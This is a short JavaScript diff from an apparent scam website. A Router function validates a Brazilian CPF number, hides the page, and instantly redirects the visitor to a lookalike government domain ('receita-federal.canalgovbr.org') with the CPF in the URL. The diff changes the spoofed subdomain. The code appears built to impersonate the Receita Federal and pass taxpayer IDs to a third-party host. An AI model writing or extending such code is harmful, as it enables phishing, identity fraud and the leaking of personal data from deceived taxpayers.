@@ -20,7 +20,7 @@ function Router() {
     
     // Verificar se tem exatamente 11 dígitos após limpeza
     if (cleanCpf.length === 11 && /^\d{11}$/.test(cleanCpf)) {
-      const receitaUrl = `https://receita.canalgovbr.org/${cleanCpf}`;
+      const receitaUrl = `https://receita-federal.canalgovbr.org/${cleanCpf}`;
       
       // Esconder página e redirecionar instantaneamente
       document.body.style.display = 'none';
